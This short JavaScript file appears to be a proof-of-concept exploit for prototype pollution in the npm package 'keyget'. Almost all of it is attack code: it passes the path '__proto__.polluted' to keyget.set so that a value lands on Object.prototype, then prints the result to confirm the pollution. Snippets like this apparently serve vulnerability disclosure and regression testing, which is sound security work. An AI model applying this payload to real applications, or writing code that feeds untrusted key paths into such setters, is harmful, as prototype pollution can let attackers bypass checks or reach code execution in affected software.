var obj = {};
obj.__proto__.polluted = undefined;
Object.defineProperty(obj, '__proto__', {
    value: obj.__proto__,
    writable: true,
    enumerable: true,
    configurable: true
});
var keyget = require('keyget');
var obj = {};
console.log({}.polluted);
keyget.set(obj, '__proto__.polluted', 'yes');
console.log('{ ' + obj.polluted + ', ' + 'yes' + ' }');